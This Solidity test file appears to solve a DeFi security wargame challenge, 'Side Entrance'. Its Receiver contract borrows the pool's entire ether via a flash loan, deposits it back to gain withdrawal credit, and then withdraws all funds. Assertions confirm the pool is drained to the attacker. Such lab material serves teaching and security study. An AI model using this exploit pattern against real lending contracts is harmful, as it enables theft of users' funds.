// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/side-entrance/SideEntranceLenderPool.sol";

import "openzeppelin-contracts/utils/Address.sol";

contract Receiver is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        pool.deposit{value: msg.value}();
    }

    function flashLoan(uint256 amount) external payable {
        pool.flashLoan(amount);
    }

    function withdraw() external {
        require(msg.sender == owner, "only owner");
        pool.withdraw();
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {}
}

contract SideEntranceLenderPoolTest is BaseTest {
    // Pool has 1000 ETH in balance
    uint256 ETHER_IN_POOL = 1000 ether;
    uint256 ETHER_ATTACKER = 1 ether;

    SideEntranceLenderPool pool;

    // Receiver receiver;
    address payable attacker;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";

        preSetup(2, ETHER_ATTACKER, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        pool = new SideEntranceLenderPool();
        vm.label(address(pool), "SideEntranceLenderPool");

        vm.deal(address(pool), ETHER_IN_POOL);

        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(attacker.balance, ETHER_ATTACKER);
    }

    function test_ExploitSideEntrance() public {
        runTest();
    }

    function exploit() internal override {
        vm.startPrank(attacker);
        Receiver receiver = new Receiver(pool);
        receiver.flashLoan(ETHER_IN_POOL);
        receiver.withdraw();
        vm.stopPrank();
    }

    function success() internal override {
        assertEq(address(pool).balance, 0);
        assertEq(attacker.balance, ETHER_IN_POOL + ETHER_ATTACKER);
    }
}
